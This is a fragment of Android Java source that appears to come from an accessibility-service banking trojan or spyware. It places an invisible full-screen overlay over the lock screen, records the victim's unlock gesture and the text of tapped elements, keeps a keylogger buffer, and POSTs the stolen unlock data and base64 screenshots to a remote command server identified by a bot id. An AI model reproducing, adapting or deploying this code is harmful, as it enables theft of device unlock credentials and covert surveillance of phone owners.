                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.BOTTOM;
        params.height = getResources().getDisplayMetrics().heightPixels + navigationBarHeight;

        overlayViewTouch = new View(this);
        overlayViewTouch.setBackgroundColor(Color.TRANSPARENT);
        windowManagerTouch.addView(overlayViewTouch, params);


        overlayViewTouch.setOnTouchListener(new View.OnTouchListener() {
            private final ArrayList<PointF> gesturePoints = new ArrayList<>();
            long startTime, endTime;

            float offsetX, offsetY;

            @Override
            public boolean onTouch(View v, MotionEvent event) {

                if(ignoreTouches) {
                    return true;
                }

                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        offsetX = event.getRawX() - event.getX();
                        offsetY = event.getRawY() - event.getY();
                        gesturePoints.add(new PointF(event.getRawX() - offsetX, event.getRawY() - offsetY));
                        startTime = System.currentTimeMillis();

                        AccessibilityNodeInfo root = getRootInActiveWindow();
                        if (root != null) {
                            AccessibilityNodeInfo node = findClickableNodeAtPosition(root, (int) ((int) event.getRawX() - offsetX), (int) ((int) event.getRawY() - offsetY));
                            if (node != null) {
                                if (node.getText() != null) {
                                    Log.d(TAG_LOG, "NodeText at position: " + node.getText());
                                    gestureTexts.put(node.getText());
                                } else if (node.getContentDescription() != null) {
                                    Log.d(TAG_LOG, "NodeDesc at position: " + node.getContentDescription());
                                    gestureTexts.put(node.getContentDescription());
                                }
                            }
                            root.recycle();
                        }

                        return true;
                    case MotionEvent.ACTION_MOVE:
                        gesturePoints.add(new PointF(event.getRawX() - offsetX, event.getRawY() - offsetY));
                        return true;
                    case MotionEvent.ACTION_UP:
                        gesturePoints.add(new PointF(event.getRawX() - offsetX, event.getRawY() - offsetY));
                        for (PointF point : gesturePoints) {
                            //Log.i(TAG_LOG, "Point: (" + point.x + "," + point.y + ")");
                        }
                        endTime = System.currentTimeMillis();
                        long duration;
                        if (endTime < startTime) {
                            duration = 100;
                        } else {
                            duration = (endTime - startTime);
                        }
                        long currentTime = System.currentTimeMillis();
                        long inactiveDuration = currentTime - lastinteraction;


                        JSONArray pointsArr = pointsToJsonArray(gesturePoints);
                        JSONObject pointsObj = new JSONObject();
                        try {
                            pointsObj.put("points", pointsArr);
                            pointsObj.put("dur", duration);

                            if (lastinteraction != 0) {
                                Log.d(TAG_LOG, "last interact: " + inactiveDuration);
                                pointsObj.put("last", inactiveDuration);
                            } else {
                                pointsObj.put("last", 0);
                            }
                            lastinteraction = currentTime;
                        } catch (JSONException e) {
                            throw new RuntimeException(e);
                        }

                        currentGesturePoints.put(pointsObj);

                        Log.d(TAG_LOG, String.valueOf(currentGesturePoints));


                        List<PointF> points = new ArrayList<>();
                        try {
                            for (int i = 0; i < pointsArr.length(); i++) {
                                JSONObject pointObject = pointsArr.getJSONObject(i);
                                float x = (float) pointObject.getDouble("x");
                                float y = (float) pointObject.getDouble("y");
                                points.add(new PointF(x, y));
                            }
                        } catch (Exception e) {
                            Log.d(TAG_LOG, e.toString());
                        }

                        if (overlayViewTouch != null) {
                            windowManagerTouch.removeView(overlayViewTouch);
                            overlayViewTouch = null;
                        }

                        TouchRunnableOut = new Runnable() {
                            @Override
                            public void run() {
                                if (overlayViewTouch == null) {
                                    performComplexGesture(points, duration);
                                    TouchHandler.postDelayed(TouchRunnableIn, duration);
                                }
                            }
                        };

                        TouchRunnableIn = new Runnable() {
                            @Override
                            public void run() {
                                ignoreTouches = false;
                                touchRecorder();

                            }
                        };

                        ignoreTouches = true;
                        TouchHandler.postDelayed(TouchRunnableOut, 50);


                        gesturePoints.clear();
                        return true;
                }
                return false;
            }
        });
    }


    private class ScreenStatusReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
                String times = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("id", utl.randomString(17));
                    jsonObject.put("time", times);
                    jsonObject.put("date", date);
                    jsonObject.put("app_name", "LOCKSCREEN");
                    jsonObject.put("package_name", "");
                    jsonObject.put("action", "");
                    textKeylogger = textKeylogger + jsonObject.toString() + consts.string_56;
                } catch (Exception e){
                    Log.d(TAG_LOG, e.toString());
                }
            }
            if (utl.SettingsRead(getApplicationContext(), "unlock_pass_found").equals("false")) {
                if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                    try {
                        recordGesture = true;
                        lastinteraction = 0;
                        touchRecorder();

                    } catch (Exception e) {
                        Log.d(TAG_LOG, e.toString());
                    }
                } else if (intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                    try {
                        utl.SettingsWrite(getApplicationContext(), "unlock_pass_found", "true");
                        recordGesture = false;
                        windowManagerTouch.removeView(overlayViewTouch);
                        overlayViewTouch.setOnTouchListener(null);
                        overlayViewTouch = null;
                        lastinteraction = 0;
                        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
                        Date date = new Date();
                        try {
                            currenGestureRecroding.put("points", currentGesturePoints);
                            currenGestureRecroding.put("time", dateFormat.format(date));
                        } catch (JSONException e) {
                            throw new RuntimeException(e);
                        }
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("id", id_bot);
                        jsonObject.put("date", dateFormat.format(date));
                        jsonObject.put("type", "unlock");
                        jsonObject.put("text", gestureTexts.toString());
                        jsonObject.put("gesture", currenGestureRecroding.toString());
                        gestureTexts = new JSONArray();
                        if (consts.ssl) {
                            sendPostRequest("https://" + consts.ws_url + "/gesture", jsonObject.toString());
                        } else {
                            sendPostRequest("http://" + consts.ws_url + "/gesture", jsonObject.toString());
                        }
                        currentGesturePoints = new JSONArray();
                    } catch (Exception e) {
                        Log.d(TAG_LOG, e.toString());
                    }
                }
            }
        }
    }
    private AccessibilityNodeInfo findClickableNodeAtPosition(AccessibilityNodeInfo node, int x, int y) {
        if (node == null) {
            return null;
        }
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        if (bounds.contains(x, y) && node.isClickable()) {
            return node;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo hitNode = findClickableNodeAtPosition(node.getChild(i), x, y);
            if (hitNode != null) {
                return hitNode;
            }
        }

        return null;
    }

    public JSONArray pointsToJsonArray(List<PointF> points) {
        JSONArray jsonArray = new JSONArray();
        for (PointF point : points) {
            JSONObject jsonObject = new JSONObject();
            try {
                jsonObject.put("x", point.x);
                jsonObject.put("y", point.y);
                jsonArray.put(jsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return jsonArray;
    }



    private final BroadcastReceiver screenCaptureReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String base64Image = intent.getStringExtra("base64Image");
            //Log.d(TAG,base64Image);

            if (base64Image != "") {
                JSONObject jsonObject = new JSONObject();
                try {
                    jsonObject.put("bot", id_bot);
                    jsonObject.put("image", base64Image);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                if (consts.ssl) {
                    sendPostRequest("https://" + consts.ws_url + "/image", jsonObject.toString());
                } else {
                    sendPostRequest("http://" + consts.ws_url + "/image", jsonObject.toString());
                }
            }

        }
    };

    private void sendPostRequest(String url, String data) {
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody = RequestBody.create(mediaType, data);

        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG_LOG, "POST request successful: " + response.body().string());
                } else {
                    Log.d(TAG_LOG,"Error: " + response.code());
                    Log.d(TAG_LOG,"Error: " + response);
                }
            }
        });
    }
}

